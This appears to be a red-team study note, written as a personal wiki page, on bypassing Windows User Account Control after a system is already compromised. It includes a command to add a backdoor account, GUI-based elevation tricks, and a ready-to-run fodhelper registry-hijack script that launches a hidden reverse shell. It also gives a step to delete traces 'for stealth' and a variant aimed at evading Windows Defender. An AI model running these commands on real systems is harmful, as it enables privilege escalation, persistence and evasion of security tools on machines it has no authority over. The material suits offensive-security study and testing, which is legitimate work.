# Bypassing Windows User Account Control

For the fundementals of UAC see [[Windows-User-Account-Control]]

When creating a backdoor post exploit you may see this error:
```powershell
net user backdoor Backd00r /add
System error 5 has occurred.

Access is denied.
```

`whoami /groups` will show that the session is running in medium Integrity Levels, UAC prevents even Administrators from performing administrative tasks with filtered token.

## GUI Based Bypasses

#### msconfig

From the `Search -> Run`  open `msconfig`, using the [[Process-Hacker]] if it runs with High IL: navigate to the `Tools` tab and select `Command Prompt` 

#### azman.msc 
From the `Search -> Run`  open, using the [[Process-Hacker]] if it runs with High IL: Click the tab `Help -> Help Topics -> Right-Click -> View-Source`, which will open notepad `File -> Open C:\Windows\System32\cmd.exe`, but then when you find it in the file listing `Right-Click -> Open`

## UAC AutoElevate Processes

Some executable can auto-elevate to high IL - most of Control Panel's functionality and some native executables. Requirements for auto-elevation:
1. The executable must be signed by Windows Publisher
2. The executable must be contained in trusted directory, like %SystemRoot%/System32/ or %ProgramFiles%/

Additional requirements depending on application:
	1. Executable files must declare the autoElevate element inside their manifests - use [[Sysinternals-Sigcheck]] to check manifest.
	2. mmc.exe will auto elevate depending on the .msc snap-in taht the user requests - most Windows .msc files will auto-elevate.
	3. Windows keeps an additional list of executables that auto elevate even when not requested in the manifest. [[UAC-AutoElevate-List]]
	4. COM objects can request auto-elevation by configuring registry keys [Docs](https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker)

#### fodhelper
fodhelper is default windows executable in charge of mangaing Windows optional features, infmaously used in [Glupteba Malware](https://www.cybereason.com/blog/research/glupteba-expands-operation-and-toolkit-with-lolbins-cryptominer-and-router-exploit). Fodhelper can auto elevate when using default settings and can be exploited without GUI access. 

Create a association for ProgID for a file in current users HKCU, allow us to overrride the default system-wide association and cointrol the `command` used to open that file. To elaborate, the Programming ID(ProgID) key in the registry is associatated with the application. Windows prioritises the HKCU over the HKLM key. The command used to specify the subkey located within the registry tree  `shell/open/command`. 

```batch
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\<reverse-shell.exe> <reverse-shell-commands>""
reg add %REG_KEY% /v "DelegateExecute" /d "" /f 
reg add %REG_KEY% /d %CMD% /f
```

Delete for stealth:
```batch
reg delete HKCU\Software\Classes\ms-settings\ /f
```

## Windows Defender
Same as the above, but the final line is:
```batch
reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
```

Warning this may still fail. It succeeds base whether the payload or AV executes first. It is still detected by Windows Defender. The improved version is from :[v3ded](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses)

## Reference
[COM Elevation Moniker Documentation](https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker)
[Glupteba Malware](https://www.cybereason.com/blog/research/glupteba-expands-operation-and-toolkit-with-lolbins-cryptominer-and-router-exploit)
[v3ded Utilizing Programmatic Identifiers (ProgIDs) for UAC Bypasses](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses)](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses)